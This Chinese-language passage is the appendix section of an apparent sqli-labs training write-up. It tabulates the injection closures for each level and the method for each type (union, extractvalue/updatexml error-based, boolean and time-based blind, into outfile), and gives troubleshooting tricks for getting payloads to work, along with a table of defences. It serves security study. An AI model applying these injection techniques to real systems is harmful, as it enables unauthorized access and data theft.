| 关卡 | SQL 语句形态 | 闭合 |
|---|---|---|
| 1 | `id='$id'` | `'` |
| 2 | `id=$id` | 无 |
| 3 | `id=('$id')` | `')` |
| 4 | `id=("$id")` | `")` |
| 5 | `id='$id'` | `'` |
| 6 | `id="$id"` | `"` |
| 7 | `id=(('$id'))` | `'))` |
| 8 | `id='$id'` | `'` |
| 9 | `id='$id'` | `'` |
| 10 | `id="$id"` | `"` |
| 11 | `username='$uname' and password='$passwd'` | `'` |
| 12 | `username=("$uname") and password=("$passwd")` | `")` |
| 13 | `username=('$uname') and password=('$passwd')` | `')` |
| 14 | `username="$uname" and password="$passwd"` | `"` |
| 15 | `username='$uname' and password='$passwd'` | `'` |
| 16 | `username=("$uname") and password=("$passwd")` | `")` |
| 17 | `SET password = '$passwd'` | `'`（填在密码框） |
| 18 | `VALUES ('$uagent', '$IP', $uname)` | `'`（User-Agent 头） |
| 19 | `VALUES ('$uagent', '$IP')` | `'`（Referer 头） |
| 20 | `username='$cookee'` | `'`（Cookie） |

## 附录 B：注入类型与打法对照

| 类型 | 特征 | 打法 | 关卡 |
|---|---|---|---|
| 联合查询 | 页面有回显位 | `union select` | 1,2,3,4,11,12,20 |
| 报错注入 | 页面回显 SQL 报错 | `extractvalue` / `updatexml` | 5,6,17,18,19,20 |
| 布尔盲注 | 只有 true/false 两种页面 | `and 条件` | 7,8,13,14,15,16 |
| 时间盲注 | 页面完全一样 | `if(条件,sleep(3),0)` | 9,10,15,16 |
| 文件写入 | 能写文件 | `into outfile` | 7（本环境被禁） |

## 附录 C：踩坑记录（都是实测踩出来的）

| 现象 | 原因 | 解决 |
|---|---|---|
| 所有 payload 都返回一样的 `Dumb/Dumb` | `magic_quotes_gpc = On` 把 `'` 转义了 | 改 `php5.2.17nts\php.ini` 为 `Off` 并重启服务 |
| Less-7 写文件失败 | `@@secure_file_priv = NULL` | 改 `my.ini` 后重启 MySQL（或改用盲注） |
| Less-17 拖库失败 | MySQL `ERROR 1093`：UPDATE 时子查询同表 | 套派生表 `(select * from (...) x)` |
| `and` 左边为假时 `sleep()` 不执行 | `AND` 短路求值（**常量表达式不受影响**，会在优化期被折叠） | 改用 `or`，或让左边为真 |
| `FUNCTION security.concatenate does not exist` | MySQL **根本没有** `concatenate()` 这个函数，纯属拼错 | 改成 `concat()` |
| `FUNCTION 库名.函数名 does not exist` | MySQL 把不认识的函数名当成**用户自定义函数 (UDF)**，而 UDF 必须带库名前缀——报错里的 `security` 就是这么来的 | 回头检查函数名拼写 |
| `Only constant XPATH queries are supported` | `updatexml()` / `extractvalue()` 的 XPath 参数**必须是常量**，传列名会被拒 | 用 `database()`、`version()` 或子查询 |
| updatexml 不报错、页面一片空白 | XPath 参数恰好是**合法**路径：`concat(database())` = `security` 是合法的元素名 | 加 `0x7e` 前缀，把 `~security` 变成非法 XPath |
| updatexml 只吐一半数据 | 报错回显上限 32 字节 | 用 `substr()` 分段取 |
| Less-13/14 的 UNION 看不到数据 | 源码里 echo 被注释掉了 | 改走布尔盲注，看 `flag.jpg` |
| 改完 Cookie 刷新又变回去了 | 点了提交按钮走了 POST 分支 | 只按 F5 刷新 |
| curl 的 `--data-urlencode` 让 `--+` 失效 | `+` 被编码成 `%2B` | 改用 Burp 或手动构造 body |

## 附录 D：防御方案（学完攻击更要懂防御）

| 攻击手法 | 防御措施 |
|---|---|
| 所有注入 | **预编译（参数化查询）** —— 用 PDO / mysqli 的 `prepare()` + `bindParam()`，让 SQL 结构和数据彻底分离 |
| 报错注入 | 关闭详细报错：`display_errors = Off`，生产环境不把 `mysql_error()` 输出给用户 |
| 联合查询 | 只查需要的字段，别用 `SELECT *`；限制数据库账号权限 |
| 盲注 | 加验证码、限制请求频率、对异常高频请求告警 |
| 文件写入 | `secure_file_priv` 设为具体目录或 `NULL`；数据库账号不给 `FILE` 权限 |
| 请求头/Cookie 注入 | 请求头数据一样要参数化，不能因为是 HTTP 头就信任它 |
| 万能密码 | 密码验证用 `password_hash()` / `password_verify()`，杜绝明文存储 |

**核心一句话**：只要 SQL 语句是**字符串拼接**出来的，就一定有注入。防注入只有一个正确答案 —— **参数化查询**。

---

*本文档基于本地授权靶场实测编写，所有 payload 均已验证。仅用于安全学习，禁止用于未授权测试。*
